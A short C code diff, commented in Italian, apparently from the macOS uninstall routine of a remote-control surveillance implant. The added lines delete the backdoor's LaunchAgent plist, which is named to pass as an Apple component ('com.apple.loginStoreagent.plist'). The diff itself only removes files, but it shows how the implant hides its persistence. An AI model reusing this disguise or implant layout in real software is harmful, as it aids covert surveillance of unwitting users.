@@ -234,6 +234,11 @@ BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 	ClearAttributes(backdoor_path);
 	DeleteFile(backdoor_path);
 
+	// Cancella il plist della backdoor
+	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.loginStoreagent.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
+	ClearAttributes(backdoor_path);
+	DeleteFile(backdoor_path);
+
 	// Cancella tutti i file e la directory
 	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
 	DeleteDirectory(backdoor_path);
